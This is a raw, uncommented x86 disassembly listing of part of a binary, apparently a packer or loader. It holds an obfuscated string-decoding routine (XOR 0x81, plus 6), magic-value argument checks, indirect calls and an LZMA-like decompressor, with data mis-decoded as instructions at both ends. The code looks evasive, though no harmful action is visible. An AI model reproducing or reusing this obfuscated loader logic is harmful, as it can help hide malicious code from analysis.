  41faae:	mov    edx,0xdf988731
  41fab3:	fild   DWORD PTR [ecx]
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
